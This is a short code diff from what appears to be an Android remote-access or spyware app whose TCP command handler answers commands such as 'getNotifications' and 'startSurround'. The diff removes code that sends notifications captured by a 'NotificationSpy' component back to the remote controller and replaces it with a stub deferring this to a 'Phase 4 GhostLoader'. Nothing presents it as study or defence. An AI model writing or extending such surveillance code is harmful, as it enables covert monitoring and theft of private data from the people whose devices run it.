@@ -314,15 +314,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 }
                 else if(line.equals("getNotifications"))
                 {
-                    List<String> logs = NotificationSpy.getAndClearLogs();
-                    if (logs.isEmpty()) {
-                        out.write("No new notifications captured.\n".getBytes("UTF-8"));
-                    } else {
-                        out.write(("=== " + logs.size() + " NOTIFICATIONS ==="+ "\n").getBytes("UTF-8"));
-                        for (String log : logs) {
-                            out.write((log + "\n").getBytes("UTF-8"));
-                        }
-                    }
+                    out.write("Notification scraping deferred to Phase 4 GhostLoader\n".getBytes("UTF-8"));
                     out.write("END123\n".getBytes("UTF-8"));
                 }
                 else if(line.equals("startSurround"))
